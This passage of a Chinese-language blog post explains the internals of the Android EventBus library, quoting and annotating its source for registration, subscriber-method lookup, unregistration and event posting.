指定事件订阅方法的优先级，默认为0，如果多个事件订阅方法可以接收相同事件的，则优先级高的先接收到事件</span><br><span class="line">    int priority() default 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可以发现，在使用Subscribe注解时可以根据需求指定threadMode、sticky、priority三个属性。其中，threadMode属性有如下几个可选值：</p><ul><li>ThreadMode.POSTING，默认的线程模式，在那个线程发送事件就在对应线程处理事件，避免了线程切换，效率高。 <ul><li>ThreadMode.MAIN，如在主线程（UI线程）发送事件，则直接在主线程处理事件；如果在子线程发送事件，则先将事件入队列，然后通过 Handler 切换到主线程，依次处理事件。</li><li>ThreadMode.MAIN_ORDERED，无论在那个线程发送事件，都先将事件入队列，然后通过 Handler 切换到主线程，依次处理事件。 </li><li>ThreadMode.BACKGROUND，如果在主线程发送事件，则先将事件入队列，然后通过线程池依次处理事件；如果在子线程发送事件，则直接在发送事件的线程处理事件。 </li><li>ThreadMode.ASYNC，无论在那个线程发送事件，都将事件入队列，然后通过线程池处理。</li></ul></li></ul><h2 id="注册事件订阅方法"><a href="#注册事件订阅方法" class="headerlink" title="注册事件订阅方法"></a>注册事件订阅方法</h2><p>使用EventBus时，需要在在需要接收事件的地方订阅事件，注册事件的方式如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">EventBus.getDefault().register(this);</span><br></pre></td></tr></table></figure><p>点击打开getDefault()会发现，getDefault()是一个单例方法，保证当前只有一个EventBus实例。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">public static EventBus getDefault() &#123;</span><br><span class="line">        if (defaultInstance &#x3D;&#x3D; null) &#123;</span><br><span class="line">            synchronized (EventBus.class) &#123;</span><br><span class="line">                if (defaultInstance &#x3D;&#x3D; null) &#123;</span><br><span class="line">                    defaultInstance &#x3D; new EventBus();</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        return defaultInstance;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>getDefault()最终调用了new EventBus()，如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">public EventBus() &#123;</span><br><span class="line">        this(DEFAULT_BUILDER);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>然后，EventBus调用它的另一个构造函数来完成它相关属性的初始化：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">EventBus(EventBusBuilder builder) &#123;</span><br><span class="line">        logger &#x3D; builder.getLogger();</span><br><span class="line">        subscriptionsByEventType &#x3D; new HashMap&lt;&gt;();</span><br><span class="line">        typesBySubscriber &#x3D; new HashMap&lt;&gt;();</span><br><span class="line">        stickyEvents &#x3D; new ConcurrentHashMap&lt;&gt;();</span><br><span class="line">        mainThreadSupport &#x3D; builder.getMainThreadSupport();</span><br><span class="line">        mainThreadPoster &#x3D; mainThreadSupport !&#x3D; null ? mainThreadSupport.createPoster(this) : null;</span><br><span class="line">        backgroundPoster &#x3D; new BackgroundPoster(this);</span><br><span class="line">        asyncPoster &#x3D; new AsyncPoster(this);</span><br><span class="line">        indexCount &#x3D; builder.subscriberInfoIndexes !&#x3D; null ? builder.subscriberInfoIndexes.size() : 0;</span><br><span class="line">        subscriberMethodFinder &#x3D; new SubscriberMethodFinder(builder.subscriberInfoIndexes,</span><br><span class="line">                builder.strictMethodVerification, builder.ignoreGeneratedIndex);</span><br><span class="line">        logSubscriberExceptions &#x3D; builder.logSubscriberExceptions;</span><br><span class="line">        logNoSubscriberMessages &#x3D; builder.logNoSubscriberMessages;</span><br><span class="line">        sendSubscriberExceptionEvent &#x3D; builder.sendSubscriberExceptionEvent;</span><br><span class="line">        sendNoSubscriberEvent &#x3D; builder.sendNoSubscriberEvent;</span><br><span class="line">        throwSubscriberException &#x3D; builder.throwSubscriberException;</span><br><span class="line">        eventInheritance &#x3D; builder.eventInheritance;</span><br><span class="line">        executorService &#x3D; builder.executorService;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>其中，DEFAULT_BUILDER就是一个默认的EventBusBuilder，如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">private static final EventBusBuilder DEFAULT_BUILDER &#x3D; new EventBusBuilder();</span><br></pre></td></tr></table></figure><p>如果有需要的话，我们也可以通过配置EventBusBuilder来更改EventBus的属性，例如：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">EventBus.builder()</span><br><span class="line">        .eventInheritance(false)</span><br><span class="line">        .logSubscriberExceptions(false)</span><br><span class="line">        .build()</span><br><span class="line">        .register(this);</span><br></pre></td></tr></table></figure><p>有了EventBus的实例，接下来就可以进行注册了。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">public void register(Object subscriber) &#123;</span><br><span class="line">        &#x2F;&#x2F; 得到当前要注册类的Class对象</span><br><span class="line">        Class&lt;?&gt; subscriberClass &#x3D; subscriber.getClass();</span><br><span class="line">        &#x2F;&#x2F; 根据Class查找当前类中订阅了事件的方法集合，即使用了Subscribe注解、有public修饰符、一个参数的方法</span><br><span class="line">        &#x2F;&#x2F; SubscriberMethod类主要封装了符合条件方法的相关信息：</span><br><span class="line">        &#x2F;&#x2F; Method对象、线程模式、事件类型、优先级、是否是粘性事等</span><br><span class="line">        List&lt;SubscriberMethod&gt; subscriberMethods &#x3D; subscriberMethodFinder.findSubscriberMethods(subscriberClass);</span><br><span class="line">        synchronized (this) &#123;</span><br><span class="line">            &#x2F;&#x2F; 循环遍历订阅了事件的方法集合，以完成注册</span><br><span class="line">            for (SubscriberMethod subscriberMethod : subscriberMethods) &#123;</span><br><span class="line">                subscribe(subscriber, subscriberMethod);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>可以看到，register()方法主要分为查找和注册两部分，首先来看查找的过程，主要是findSubscriberMethods()方法：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">List&lt;SubscriberMethod&gt; findSubscriberMethods(Class&lt;?&gt; subscriberClass) &#123;</span><br><span class="line">        &#x2F;&#x2F; METHOD_CACHE是一个ConcurrentHashMap，直接保存了subscriberClass和对应SubscriberMethod的集合，以提高注册效率，赋值重复查找。</span><br><span class="line">        List&lt;SubscriberMethod&gt; subscriberMethods &#x3D; METHOD_CACHE.get(subscriberClass);</span><br><span class="line">        if (subscriberMethods !&#x3D; null) &#123;</span><br><span class="line">            return subscriberMethods;</span><br><span class="line">        &#125;</span><br><span class="line">        &#x2F;&#x2F; 由于使用了默认的EventBusBuilder，则ignoreGeneratedIndex属性默认为false，即是否忽略注解生成器</span><br><span class="line">        if (ignoreGeneratedIndex) &#123;</span><br><span class="line">            subscriberMethods &#x3D; findUsingReflection(subscriberClass);</span><br><span class="line">        &#125; else &#123;</span><br><span class="line">            subscriberMethods &#x3D; findUsingInfo(subscriberClass);</span><br><span class="line">        &#125;</span><br><span class="line">        &#x2F;&#x2F; 如果对应类中没有符合条件的方法，则抛出异常</span><br><span class="line">        if (subscriberMethods.isEmpty()) &#123;</span><br><span class="line">            throw new EventBusException(&quot;Subscriber &quot; + subscriberClass</span><br><span class="line">                    + &quot; and its super classes have no public methods with the @Subscribe annotation&quot;);</span><br><span class="line">        &#125; else &#123;</span><br><span class="line">            &#x2F;&#x2F; 保存查找到的订阅事件的方法</span><br><span class="line">            METHOD_CACHE.put(subscriberClass, subscriberMethods);</span><br><span class="line">            return subscriberMethods;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>findSubscriberMethods()流程很清晰，即先从缓存中查找，如果找到则直接返回，否则去做下一步的查找过程，然后缓存查找到的集合，根据上边的注释可知findUsingInfo()方法会被调用。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">private List&lt;SubscriberMethod&gt; findUsingInfo(Class&lt;?&gt; subscriberClass) &#123;</span><br><span class="line">        FindState findState &#x3D; prepareFindState();</span><br><span class="line">        findState.initForSubscriber(subscriberClass);</span><br><span class="line">        &#x2F;&#x2F; 初始状态下findState.clazz就是subscriberClass</span><br><span class="line">        while (findState.clazz !&#x3D; null) &#123;</span><br><span class="line">            findState.subscriberInfo &#x3D; getSubscriberInfo(findState);</span><br><span class="line">            &#x2F;&#x2F; 条件不成立</span><br><span class="line">            if (findState.subscriberInfo !&#x3D; null) &#123;</span><br><span class="line">                SubscriberMethod[] array &#x3D; findState.subscriberInfo.getSubscriberMethods();</span><br><span class="line">                for (SubscriberMethod subscriberMethod : array) &#123;</span><br><span class="line">                    if (findState.checkAdd(subscriberMethod.method, subscriberMethod.eventType)) &#123;</span><br><span class="line">                        findState.subscriberMethods.add(subscriberMethod);</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125; else &#123;</span><br><span class="line">                &#x2F;&#x2F; 通过反射查找订阅事件的方法</span><br><span class="line">                findUsingReflectionInSingleClass(findState);</span><br><span class="line">            &#125;</span><br><span class="line">            &#x2F;&#x2F; 修改findState.clazz为subscriberClass的父类Class，即需要遍历父类</span><br><span class="line">            findState.moveToSuperclass();</span><br><span class="line">        &#125;</span><br><span class="line">        &#x2F;&#x2F; 查找到的方法保存在了FindState实例的subscriberMethods集合中。</span><br><span class="line">        &#x2F;&#x2F; 使用subscriberMethods构建一个新的List&lt;SubscriberMethod&gt;</span><br><span class="line">        &#x2F;&#x2F; 释放掉findState</span><br><span class="line">        return getMethodsAndRelease(findState);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>findUsingInfo()方法会在当前要注册的类以及其父类中查找订阅事件的方法，这里出现了一个FindState类，它是SubscriberMethodFinder的内部类，用来辅助查找订阅事件的方法，具体的查找过程在findUsingReflectionInSingleClass()方法里，它主要通过反射来查找订阅事件的方法。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line">private void findUsingReflectionInSingleClass(FindState findState) &#123;</span><br><span class="line">        Method[] methods;</span><br><span class="line">        try &#123;</span><br><span class="line">            &#x2F;&#x2F; This is faster than getMethods, especially when subscribers are fat classes like Activities</span><br><span class="line">            methods &#x3D; findState.clazz.getDeclaredMethods();</span><br><span class="line">        &#125; catch (Throwable th) &#123;</span><br><span class="line">            &#x2F;&#x2F; Workaround for java.lang.NoClassDefFoundError, see https:&#x2F;&#x2F;github.com&#x2F;greenrobot&#x2F;EventBus&#x2F;issues&#x2F;149</span><br><span class="line">            methods &#x3D; findState.clazz.getMethods();</span><br><span class="line">            findState.skipSuperClasses &#x3D; true;</span><br><span class="line">        &#125;</span><br><span class="line">        &#x2F;&#x2F; 循环遍历当前类的方法，筛选出符合条件的</span><br><span class="line">        for (Method method : methods) &#123;</span><br><span class="line">            &#x2F;&#x2F; 获得方法的修饰符</span><br><span class="line">            int modifiers &#x3D; method.getModifiers();</span><br><span class="line">            &#x2F;&#x2F; 如果是public类型，但非abstract、static等</span><br><span class="line">            if ((modifiers &amp; Modifier.PUBLIC) !&#x3D; 0 &amp;&amp; (modifiers &amp; MODIFIERS_IGNORE) &#x3D;&#x3D; 0) &#123;</span><br><span class="line">                &#x2F;&#x2F; 获得当前方法所有参数的类型</span><br><span class="line">                Class&lt;?&gt;[] parameterTypes &#x3D; method.getParameterTypes();</span><br><span class="line">                &#x2F;&#x2F; 如果当前方法只有一个参数</span><br><span class="line">                if (parameterTypes.length &#x3D;&#x3D; 1) &#123;</span><br><span class="line">                    Subscribe subscribeAnnotation &#x3D; method.getAnnotation(Subscribe.class);</span><br><span class="line">                    &#x2F;&#x2F; 如果当前方法使用了Subscribe注解</span><br><span class="line">                    if (subscribeAnnotation !&#x3D; null) &#123;</span><br><span class="line">                        &#x2F;&#x2F; 得到该参数的类型</span><br><span class="line">                        Class&lt;?&gt; eventType &#x3D; parameterTypes[0];</span><br><span class="line">                        &#x2F;&#x2F; checkAdd()方法用来判断FindState的anyMethodByEventType map是否已经添加过以当前eventType为key的键值对，没添加过则返回true</span><br><span class="line">                        if (findState.checkAdd(method, eventType)) &#123;</span><br><span class="line">                             &#x2F;&#x2F; 得到Subscribe注解的threadMode属性值，即线程模式</span><br><span class="line">                            ThreadMode threadMode &#x3D; subscribeAnnotation.threadMode();</span><br><span class="line">                            &#x2F;&#x2F; 创建一个SubscriberMethod对象，并添加到subscriberMethods集合</span><br><span class="line">                            findState.subscriberMethods.add(new SubscriberMethod(method, eventType, threadMode,</span><br><span class="line">                                    subscribeAnnotation.priority(), subscribeAnnotation.sticky()));</span><br><span class="line">                        &#125;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125; else if (strictMethodVerification &amp;&amp; method.isAnnotationPresent(Subscribe.class)) &#123;</span><br><span class="line">                    String methodName &#x3D; method.getDeclaringClass().getName() + &quot;.&quot; + method.getName();</span><br><span class="line">                    throw new EventBusException(&quot;@Subscribe method &quot; + methodName +</span><br><span class="line">                            &quot;must have exactly 1 parameter but has &quot; + parameterTypes.length);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125; else if (strictMethodVerification &amp;&amp; method.isAnnotationPresent(Subscribe.class)) &#123;</span><br><span class="line">                String methodName &#x3D; method.getDeclaringClass().getName() + &quot;.&quot; + method.getName();</span><br><span class="line">                throw new EventBusException(methodName +</span><br><span class="line">                        &quot; is a illegal @Subscribe method: must be public, non-static, and non-abstract&quot;);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>到此register()方法中findSubscriberMethods()流程就分析完了，我们已经找到了当前注册类及其父类中订阅事件的方法的集合。 接下来，我们分析下具体的注册流程，即register()中的subscribe()方法。首先，我们看一下subscribe()方法的源码：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><span class="line">private void subscribe(Object subscriber, SubscriberMethod subscriberMethod) &#123;</span><br><span class="line">        &#x2F;&#x2F; 得到当前订阅了事件的方法的参数类型</span><br><span class="line">        Class&lt;?&gt; eventType &#x3D; subscriberMethod.eventType;</span><br><span class="line">        &#x2F;&#x2F; Subscription类保存了要注册的类对象以及当前的subscriberMethod</span><br><span class="line">        Subscription newSubscription &#x3D; new Subscription(subscriber, subscriberMethod);</span><br><span class="line">        &#x2F;&#x2F; subscriptionsByEventType是一个HashMap，保存了以eventType为key,Subscription对象集合为value的键值对</span><br><span class="line">        &#x2F;&#x2F; 先查找subscriptionsByEventType是否存在以当前eventType为key的值</span><br><span class="line">        CopyOnWriteArrayList&lt;Subscription&gt; subscriptions &#x3D; subscriptionsByEventType.get(eventType);</span><br><span class="line">        &#x2F;&#x2F; 如果不存在，则创建一个subscriptions，并保存到subscriptionsByEventType</span><br><span class="line">        if (subscriptions &#x3D;&#x3D; null) &#123;</span><br><span class="line">            subscriptions &#x3D; new CopyOnWriteArrayList&lt;&gt;();</span><br><span class="line">            subscriptionsByEventType.put(eventType, subscriptions);</span><br><span class="line">        &#125; else &#123;</span><br><span class="line">            if (subscriptions.contains(newSubscription)) &#123;</span><br><span class="line">                throw new EventBusException(&quot;Subscriber &quot; + subscriber.getClass() + &quot; already registered to event &quot;</span><br><span class="line">                        + eventType);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        &#x2F;&#x2F; 添加上边创建的newSubscription对象到subscriptions中</span><br><span class="line">        int size &#x3D; subscriptions.size();</span><br><span class="line">        for (int i &#x3D; 0; i &lt;&#x3D; size; i++) &#123;</span><br><span class="line">            if (i &#x3D;&#x3D; size || subscriberMethod.priority &gt; subscriptions.get(i).subscriberMethod.priority) &#123;</span><br><span class="line">                subscriptions.add(i, newSubscription);</span><br><span class="line">                break;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        &#x2F;&#x2F; typesBySubscribere也是一个HashMap，保存了以当前要注册类的对象为key，注册类中订阅事件的方法的参数类型的集合为value的键值对</span><br><span class="line">        &#x2F;&#x2F; 查找是否存在对应的参数类型集合</span><br><span class="line">        List&lt;Class&lt;?&gt;&gt; subscribedEvents &#x3D; typesBySubscriber.get(subscriber);</span><br><span class="line">        &#x2F;&#x2F; 不存在则创建一个subscribedEvents，并保存到typesBySubscriber</span><br><span class="line">        if (subscribedEvents &#x3D;&#x3D; null) &#123;</span><br><span class="line">            subscribedEvents &#x3D; new ArrayList&lt;&gt;();</span><br><span class="line">            typesBySubscriber.put(subscriber, subscribedEvents);</span><br><span class="line">        &#125;</span><br><span class="line">        &#x2F;&#x2F; 保存当前订阅了事件的方法的参数类型</span><br><span class="line">        subscribedEvents.add(eventType);</span><br><span class="line">        &#x2F;&#x2F; 粘性事件相关的，后边具体分析</span><br><span class="line">        if (subscriberMethod.sticky) &#123;</span><br><span class="line">            if (eventInheritance) &#123;</span><br><span class="line">                &#x2F;&#x2F; Existing sticky events of all subclasses of eventType have to be considered.</span><br><span class="line">                &#x2F;&#x2F; Note: Iterating over all events may be inefficient with lots of sticky events,</span><br><span class="line">                &#x2F;&#x2F; thus data structure should be changed to allow a more efficient lookup</span><br><span class="line">                &#x2F;&#x2F; (e.g. an additional map storing sub classes of super classes: Class -&gt; List&lt;Class&gt;).</span><br><span class="line">                Set&lt;Map.Entry&lt;Class&lt;?&gt;, Object&gt;&gt; entries &#x3D; stickyEvents.entrySet();</span><br><span class="line">                for (Map.Entry&lt;Class&lt;?&gt;, Object&gt; entry : entries) &#123;</span><br><span class="line">                    Class&lt;?&gt; candidateEventType &#x3D; entry.getKey();</span><br><span class="line">                    if (eventType.isAssignableFrom(candidateEventType)) &#123;</span><br><span class="line">                        Object stickyEvent &#x3D; entry.getValue();</span><br><span class="line">                        checkPostStickyEventToSubscription(newSubscription, stickyEvent);</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125; else &#123;</span><br><span class="line">                Object stickyEvent &#x3D; stickyEvents.get(eventType);</span><br><span class="line">                checkPostStickyEventToSubscription(newSubscription, stickyEvent);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>可以发现，subscribe()方法主要是得到了subscriptionsByEventType、typesBySubscriber两个 HashMap。其中，发送事件的时候要用到subscriptionsByEventType，完成事件的处理。当取消 EventBus 注册的时候要用到typesBySubscriber、subscriptionsByEventType，完成相关资源的释放。</p><h2 id="取消注册"><a href="#取消注册" class="headerlink" title="取消注册"></a>取消注册</h2><p>接下来，我们看一下EventBus 取消事件注册的流程。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">EventBus.getDefault().unregister(this);</span><br></pre></td></tr></table></figure><p>其中，unregister()的源码如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">public synchronized void unregister(Object subscriber) &#123;</span><br><span class="line">        &#x2F;&#x2F; 得到当前注册类对象 对应的 订阅事件方法的参数类型 的集合</span><br><span class="line">        List&lt;Class&lt;?&gt;&gt; subscribedTypes &#x3D; typesBySubscriber.get(subscriber);</span><br><span class="line">        if (subscribedTypes !&#x3D; null) &#123;</span><br><span class="line">            &#x2F;&#x2F; 遍历参数类型集合，释放之前缓存的当前类中的Subscription</span><br><span class="line">            for (Class&lt;?&gt; eventType : subscribedTypes) &#123;</span><br><span class="line">                unsubscribeByEventType(subscriber, eventType);</span><br><span class="line">            &#125;</span><br><span class="line">            &#x2F;&#x2F; 删除以subscriber为key的键值对</span><br><span class="line">            typesBySubscriber.remove(subscriber);</span><br><span class="line">        &#125; else &#123;</span><br><span class="line">            logger.log(Level.WARNING, &quot;Subscriber to unregister was not registered before: &quot; + subscriber.getClass());</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>unregister()方法调用了unsubscribeByEventType()方法：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">private void unsubscribeByEventType(Object subscriber, Class&lt;?&gt; eventType) &#123;</span><br><span class="line">        &#x2F;&#x2F; 得到当前参数类型对应的Subscription集合</span><br><span class="line">        List&lt;Subscription&gt; subscriptions &#x3D; subscriptionsByEventType.get(eventType);</span><br><span class="line">        if (subscriptions !&#x3D; null) &#123;</span><br><span class="line">            int size &#x3D; subscriptions.size();</span><br><span class="line">            &#x2F;&#x2F; 遍历Subscription集合</span><br><span class="line">            for (int i &#x3D; 0; i &lt; size; i++) &#123;</span><br><span class="line">                Subscription subscription &#x3D; subscriptions.get(i);</span><br><span class="line">                &#x2F;&#x2F; 如果当前subscription对象对应的注册类对象 和 要取消注册的注册类对象相同，则删除当前subscription对象</span><br><span class="line">                if (subscription.subscriber &#x3D;&#x3D; subscriber) &#123;</span><br><span class="line">                    subscription.active &#x3D; false;</span><br><span class="line">                    subscriptions.remove(i);</span><br><span class="line">                    i--;</span><br><span class="line">                    size--;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>所以，在unregister()方法中，最主要的就是释放typesBySubscriber、subscriptionsByEventType中缓存的资源。</p><h2 id="发送事件"><a href="#发送事件" class="headerlink" title="发送事件"></a>发送事件</h2><p>在EventBus中，我们发送一个事件使用的是如下的方式：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">EventBus.getDefault().post(&quot;Hello World!&quot;)</span><br></pre></td></tr></table></figure><p>可以看到，发送事件就是通过post()方法完成的，post()方法的源码如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">public void post(Object event) &#123;</span><br><span class="line">        &#x2F;&#x2F; currentPostingThreadState是一个PostingThreadState类型的ThreadLocal</span><br><span class="line">        &#x2F;&#x2F; PostingThreadState类保存了事件队列和线程模式等信息</span><br><span class="line">        PostingThreadState postingState &#x3D; currentPostingThreadState.get();</span><br><span class="line">        List&lt;Object&gt; eventQueue &#x3D; postingState.eventQueue;</span><br><span class="line">        &#x2F;&#x2F; 将要发送的事件添加到事件队列</span><br><span class="line">        eventQueue.add(event);</span><br><span class="line">        &#x2F;&#x2F; isPosting默认为false</span><br><span class="line">        if (!postingState.isPosting) &#123;</span><br><span class="line">            &#x2F;&#x2F; 是否为主线程</span><br><span class="line">            postingState.isMainThread &#x3D; isMainThread();</span><br><span class="line">            postingState.isPosting &#x3D; true;</span><br><span class="line">            if (postingState.canceled) &#123;</span><br><span class="line">                throw new EventBusException(&quot;Internal error. Abort state was not reset&quot;);</span><br><span class="line">            &#125;</span><br><span class="line">            try &#123;</span><br><span class="line">                &#x2F;&#x2F; 遍历事件队列</span><br><span class="line">                while (!eventQueue.isEmpty()) &#123;</span><br><span class="line">                    &#x2F;&#x2F; 发送单个事件</span><br><span class="line">                    &#x2F;&#x2F; eventQueue.remove(0)，从事件队列移除事件</span><br><span class="line">                    postSingleEvent(eventQueue.remove(0), postingState);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125; finally &#123;</span><br><span class="line">                postingState.isPosting &#x3D; false;</span><br><span class="line">                postingState.isMainThread &#x3D; false;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>可以发现，post()方法先将发送的事件保存到List的事件队列，然后通过循环出队列，将事件交给postSingleEvent()方法处理。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span 